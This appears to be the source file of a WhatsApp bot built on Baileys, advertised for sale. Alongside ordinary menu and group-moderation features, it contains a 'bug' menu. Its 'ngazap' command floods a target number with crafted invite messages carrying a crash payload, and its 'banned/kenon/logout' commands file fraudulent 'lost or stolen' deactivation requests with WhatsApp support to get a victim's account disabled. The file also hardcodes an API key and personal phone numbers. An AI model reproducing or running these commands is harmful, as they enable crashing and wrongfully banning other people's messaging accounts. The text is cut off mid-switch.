// Create By Ryuu Zxy`

"use strict";
require('./config.js');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, proto, prepareWAMessageMedia, ChatModification, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage, generateWAMessage, generateWAMessageFromContent, MessageType, buttonsMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./function/Data_Server_Bot/Console_Data')
const { removeEmojis, bytesToSize, getBuffer, fetchJson, getRandom, getGroupAdmins, runtime, sleep, makeid, isUrl, generateProfilePicture } = require("./function/func_Server");
const { TelegraPh, UploadFileUgu, AnonFiles } = require("./function/uploader_Media");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/func_Addlist');
const { media_JSON, mess_JSON, antilink_JSON, db_user_JSON, server_eror_JSON, welcome_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
const { mediafireDl } = require('./function/scrape_Mediafire')
const { webp2mp4File } = require("./function/Webp_Tomp4")
const { cerpen } = require('./function/Search_Cerpen')
const { getCase, jsonformat } = require('./function/myfunc')
const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat} = require ('@bochilteam/scraper') 
const { yta, ytv, igdl, upload, formatDate } = require('./function/ytdl')

const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const nyx = require('api-telnyx');
const yts = require( 'yt-search');
const qs = require("querystring");
const request = require('request');
const fetch = require("node-fetch");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const speed = require('performance-now');
const moment = require("moment-timezone");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()

const Exif = require("./function/set_WM_Sticker")
const exif = new Exif()

const msgFilter = require("./function/func_Spam");
const { stalkff, stalkml } = require("./function/func_Stalker");
const mekih = fs.readFileSync ('./function/mod.jpg')
const { ngazap } = require('./lib/ngazap')
const uang = JSON.parse(fs.readFileSync('./database/uang.json'))

let orang_spam = []
let medianya = []

const mess = mess_JSON
const antilink = antilink_JSON
const db_user = db_user_JSON
const server_eror = server_eror_JSON
const welcomeJson = welcome_JSON
const db_respon_list = db_respon_list_JSON
const auto_downloadTT = auto_downloadTT_JSON

moment.tz.setDefault("Asia/Makassar").locale("id");
module.exports = async(conn, msg, m, store) => {
try {
const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
if (msg.isBaileys) return
const jam = moment.tz('asia/Makassar').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Makassar").format("ll")
let dt = moment(Date.now()).tz('Asia/Makassar').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = [`${global.ownerNumber}@s.whatsapp.net`, `${global.ChatOwner}@s.whatsapp.net`].includes(sender) ? true : false
const ownerNmbr = `${global.ownerNumber}@s.whatsapp.net`
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
const budy = (typeof msg.text == 'string' ? msg.text : '')

const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)

const isWelcome = isGroup ? welcomeJson.includes(from) : false
const isAntiLink = antilink.includes(from) ? true : false
const isAutoDownTT = auto_downloadTT.includes(from) ? true : false

const quoted = msg.quoted ? msg.quoted : msg
const mime = (quoted.msg || quoted).mimetype || ''
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isListMessage = dataListG.length !== 0 ? dataListG : dataList

const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

try {
var pp_user = await conn.profilePictureUrl(sender, 'image')
} catch {
var pp_user = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

const PathAuto = "./function/menuPath/"

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: ftextt })
return res
}
}

function monospace(string) {
return '```' + string + '```'
}

function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const q1 = q.split('&')[0];
const q2 = q.split('&')[1];
const q3 = q.split('&')[2];

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

const reply = (teks) => {conn.sendMessage(from, { text: teks }, { quoted: ftextt })}

if (isGroup && isAntiLink) {
if (!isBotGroupAdmins) return reply('Untung Bot Bukan Admin')
var linkgce = await conn.groupInviteCode(from)
if (chats.includes(`https://chat.whatsapp.com/${linkgce}`)) {
reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
} else if (isUrl(chats)) {
let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isGroupAdmins) return reply(bvl)
if (fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
await conn.sendMessage(from, { delete: msg.key })
mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link, maaf bot akan kick kamu dari grup`, [sender])
sleep(3000)
conn.groupParticipantsUpdate(from, [sender], "remove")
} else {
}
}

if (isGroup && isAutoDownTT){
if (chats.match(/(tiktok.com)/gi)){
reply('Url tiktok terdekteksi\nWait mengecek data url.')
sleep(3000)
var tt_res = await fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${chats}&apikey=jPHjZpQF`)
reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

𝘼𝙪𝙩𝙝𝙤𝙧: ${global.ownerName}
𝙅𝙪𝙙𝙪𝙡: ${tt_res.result.judul}
𝙎𝙤𝙪𝙧𝙘𝙚: ${chats}

Video sedang dikirim...`)
conn.sendMessage(sender,{video:{url:tt_res.result.video.link1}, caption:'No Watermark!'}, {quotes:msg})
if (isGroup) return conn.sendMessage(from, {text:'Media sudah dikirim lewat chat pribadi bot.'}, {quoted:ftextt})
}}

if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
var get_data_respon = getDataResponList(from, chats, db_respon_list)
if (get_data_respon.isImage === false) {
conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, {
quoted: ftextt
})
} else {
conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: ftextt
})
}
}

const sendContact = (jid, number, name, quoted, mn) => {
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
}

conn.readMessages([msg.key])

conn.readMessages(["status@broadcast"])

const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
conn.sendMessage(to, media, type, { quoted: ftextt, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
sleep(3000)
fs.unlinkSync(filename)
});
}   

msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[ SPAM ]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [ ${args.length} ]`), 'from', color(pushname))
msgFilter.addSpam(sender, orang_spam)
reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
}

const spamgr = () => {
console.log(color('~>[ SPAM ]', 'red'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [ ${args.length} ]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, orang_spam)
reply('Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik')
}

let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
}
if (x1 == false) { return null } 
}

const addRegisterUser = (userid) => {
const obj = { id: userid }
if (cekUser("id", sender) == null) return
try { 
db_user.push(obj)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))
} catch {
conn.sendMessage(from, { text: 'Error!\nAda error saat verifikasi otomatis user!' }, { quoted: ftextt })
conn.sendMessage("6285298256587@s.whatsapp.net", { text: 'Error!\nAda error saat verifikasi otomatis user!' }, { quoted: ftextt })
}
}

const virusnya = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Ryuu Zxy ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const reSize = async(buffer, ukur1, ukur2) => {
return new Promise(async(resolve, reject) => {
let jimp = require('jimp')
var baper = await jimp.read(buffer);
var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
resolve(ab)
})
}

const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 99999,status: 200, thumbnail: await reSize(mekih, 100, 100), surface: 200, message: `Ryuu Zxy`, orderTitle: 'Ryuu Zxy', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Ryuu Zxy`,jpegthumbnail: await reSize(mekih, 100, 100)}}}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const ftextt = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { "extendedTextMessage": {"text":'Ryuu Zxy` || Deathers Team', "title": `Ryuzuu - Bot`, 'jpegthumbnail': await reSize(mekih, 100, 100)}}}
const ftoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {})}, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegthumbnail": await reSize(mekih, 100, 100)},"title": `Ryuu Zxy`, "description": `Ryuzuu - Bot`, "currencyCode": "IDR", "priceAmount1000": "1000000000000000000", "retailerId": `Ryuu Zxy`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}} 
const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`Ryuu Zxy`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `Ryuu Zxy`, 'jpegthumbnail': await reSize(mekih, 100, 100)}}}
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": `Ryuu Zxy`, "caption": `Ryuu Zxy`, 'jpegthumbnail': await reSize(mekih, 100, 100)}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":`Ryuu Zxy`, "h": `Hmm`,'seconds': '359996400', 'caption': `Ryuu Zxy`, 'jpegthumbnail': await reSize(mekih, 100, 100)}}}
const floc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `Ryuuzu - Bot`,jpegthumbnail: await reSize(mekih, 100, 100)}}}
const floc2 = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "liveLocationMessage": { "title": `Ryuu Zxy`,"h": `Hmm`, 'jpegthumbnail': await reSize(mekih, 100, 100)}}}
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `Ryuu Zxy`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ytname,;;;\nFN:ytname\nitem1.TEL;waid=6289512545999:6289512545999\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegthumbnail': await reSize(mekih, 100, 100), thumbnail: await reSize(mekih, 100, 100),sendEphemeral: true}}}
const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": `Ryuu Zxy`,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegthumbnail": await reSize(mekih, 100, 100),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender)

if (sender.startsWith('status@broadcast')) {
var owner = ["6285298256587@s.whatsapp.net"]
conn.sendMessage(owner, { text: 'Ada yang buat status di Ryuuzu - Bot ><'}, { quoted: ftextt })
conn.sendMessage(from, { text: 'Bot melihat status mu 😂'}, { quoted: ftextt })
}

if (sender.startsWith('212')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('91')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('92')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('90')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('54')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('55')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('40')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('94')) {
return conn.updateBlockStatus(sender, 'block')
}
if (sender.startsWith('60')) {
return conn.updateBlockStatus(sender, 'block')
}

const addATM = (sender) => {
const obj = {id: sender, uang : 0}
uang.push(obj)
fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
}

const addKoinUser = (sender, amount) => {
let position = false
Object.keys(uang).forEach((i) => {
if (uang[i].id === sender) {
position = i
}
})
if (position !== false) {
uang[position].uang += amount
fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
}
}

const checkATMuser = (sender) => {
let position = false
Object.keys(uang).forEach((i) => {
if (uang[i].id === sender) {
position = i
}
})
if (position !== false) {
return uang[position].uang
}
}

const confirmATM = (sender, amount) => {
let position = false
Object.keys(uang).forEach((i) => {
if (uang[i].id === sender) {
position = i
}
})
if (position !== false) {
uang[position].uang -= amount
fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
}
}
if (isGroup && isCmd && !fromMe) {
addRegisterUser(sender)
console.log(colors.green.bold("[ Group ]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd && !fromMe) {
addRegisterUser(sender)
console.log(colors.green.bold("[ Private ]") + " " + colors.brightCyan(time,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

switch(command) {
case 'ngazap': {
if (!isOwner) return reply('Cuma Owner!')
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (!q) return reply(`Penggunaan *${prefix+command} 628xxx*`)
try {
var num = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
var jumlah = '15'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./function/mod.jpg') }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME Is Ryuu Zxy ${ngazap(prefix)}`,
"groupName": `MY NAME Is Ryuu Zxy ${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegthumbnail": messa.imageMessage,
}
}), { userJid: num, quoted: virusnya })
conn.relayMessage(num, groupInvite.message, { messageId: groupInvite.key.id })
sleep(1000)
}
reply('Sukses send bug!')
} catch {
reply('Error!')
}}
break
case 'verify': case 'banned': case 'kenon': case 'logout':  {
if (!isOwner) return reply('Cuma owner!')
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
if (conn.quoted || q) {
const froms = conn.quoted ? conn.quoted.sender : q.replace(/[^0-9]/g, '')
var cekno = await conn.onWhatsApp(froms)
if (cekno.length == 0) return reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
if (froms === ownerNumber) return reply(`Tidak bisa verif My Creator!`)
var targetnya = froms.split('@')[0]
try {
var axioss = require('axios')
var ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
var email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
var cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
var $ = cheerio.load(ntah.data)
var $form = $("form");
var url = new URL($form.attr("action"), "https://www.whatsapp.com").href
var form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

var res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`Sukses!\nUser telah terbanned...`)
} else if (payload.includes(`"payload":false`)) {
reply(`Gagal!\nCoba beberapa saat lagi!`)
} else reply(util.format(res.data))
} catch (err) {conn.reply(`${err}`)}
} else conn.reply('Masukkan nomor target!')
}
break
case 'listcmd':
case 'menu':
case 'list':
case 'help':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let own = `${global.ownerNumber}`
var footer_nya = 'Ryuu Zxy` || Deathers Team'
let tampilan_nya = `
Hallo ${pushname} - ${ucapanWaktu}
Saya ${botName}

*- INFO BOT -*
Owner: ${global.ownerName}
Nomor: @${global.ownerNumber}
Waktu: ${jam}
Tanggal: ${tanggal}`
conn.sendMessage(from,
{text: tampilan_nya,
buttonText: "Klik Disini",
sections: [{title: "𝗔𝗟𝗟 𝗠𝗘𝗡𝗨",
rows: [
{title: " 𝐈𝐊𝐋𝐀𝐍 𝐁𝐎𝐓", rowId: prefix+"promo", description: "Iklan promosi bot"},
{title: " 𝐆𝐑𝐎𝐔𝐏 𝐁𝐎𝐓", rowId: prefix+"gclink", description: "Link Group Chat Bot"},
{title: " 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔", rowId: prefix+"gcmenu", description: "Menu Khusus Group"},
{title: " 𝐒𝐓𝐎𝐑𝐄 𝐌𝐄𝐍𝐔", rowId: prefix+"storemenu", description: "Menu Khusus Store"},
{title: " 𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔", rowId: prefix+"cpnmnu", description: "Menu Khusus Cpanel"},
{title: " 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", rowId: prefix+"ownmenu", description: "Menu Khusus Owner"},
{title: " 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", rowId: prefix+"bugmnu", description: "Menu Khusus Bug"},
{title: " 𝐂𝐎𝐍𝐕𝐄𝐑𝐓 𝐌𝐄𝐍𝐔", rowId: prefix+"cvmenu", description: "Menu Convert"},
{title: " 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐌𝐄𝐍𝐔", rowId: prefix+"stickmenu", description: "Menu Maker Image"},
{title: " 𝐈𝐌𝐆 𝐌𝐄𝐍𝐔", rowId: prefix+"imgmenu", description: "Menu Search Stickers"},
{title: " 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔", rowId: prefix+"othermnu", description: "Menu Lainnya"},
{title: " 𝐔𝐒𝐄𝐑 𝐌𝐄𝐍𝐔", rowId: prefix+"usrmenu", description: "Menu Khusus User"},
{title: " 𝐒𝐄𝐀𝐑𝐂𝐇 𝐌𝐄𝐍𝐔", rowId: prefix+"srchmnu", description: "Menu Khusus Search"},
{title: " 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔", rowId: prefix+"dlmenu", description: "Menu Downloader"}]},
],
footer: 'Ryuu Zxy` || Deathers Team',mentions:[global.ownerNumber, sender]})
}
break
case 'join': {
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
const reactionMessage = { react: { text: "🕑", key: msg.key}}
conn.sendMessage(from, reactionMessage)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result)
sleep(3000)
reply('Sukses!')
}
break
case 'leave': {
if (!isOwner) return reply(mess.OnlyOwner)
reoly('Bot leave in message...')
await conn.groupLeave(from)
}
break
case 'promo':{
const reactionMessage = { react: { text: "✨", key: msg.key}}
conn.sendMessage(from, reactionMessage)
var list = `*_Mau beli scriptnya? harga murah kok._*

*Contact Person 📞*
*Admin:*
*Wa.me/6281227374317*

_*Harga:*_ *~Rp50.000~* > *Rp10.000*

_Script Sudah Disusun Rapih_
_Size Script Sudah Ringan_
_Anti Ngelag - Anti Delay_
_Anti Spam - Anti Call_
_Fitur Store_

_Total Fitur 130++_`
reply(list)
}
break
case 'gclink':{
reply(`*Link GC ${global.botName}*\n${global.linkgc}\n\n*Join Bang*`)
}
break
case 'othermnu':{
return reply(`々 *Other Menu*

> ${prefix}tts
> ${prefix}get
`)
}
break
case 'cpnmnu':{
return reply(`々 *Menu Cpanel*

> ${prefix}listcp
> ${prefix}createcp
> ${prefix}terminate`)
}
break
case 'srchmnu':{
return reply(`々 *Menu Search*

> ${prefix}pin
> ${prefix}sfile
> ${prefix}linkwa
> ${prefix}happymod`)
}
break
case 'bugmnu':{
return reply(`々 *Menu Bug*

> ${prefix}ngazap
> ${prefix}kenon
> ${prefix}logout
> ${prefix}verif
> ${prefix}banned`)
}
break
case 'stickmenu':{
return reply(`々 *Search Sticker*

> ${prefix}dadu
> ${prefix}patrick
> ${prefix}amongus
> ${prefix}gawrgura
> ${prefix}anjing
> ${prefix}bucinstick`)
}
break
case 'ownmenu':{
return reply(`々 *Menu Owner*

> ${prefix}bc
> ${prefix}error
> ${prefix}clearerr
> ${prefix}restart
> ${prefix}session
> ${prefix}datauser
> ${prefix}adduang
> ${prefix}setexif
> ${prefix}setwm
> ${prefix}setppbot
> ${prefix}getcase
> ${prefix}term
> ${prefix}eval`)
}
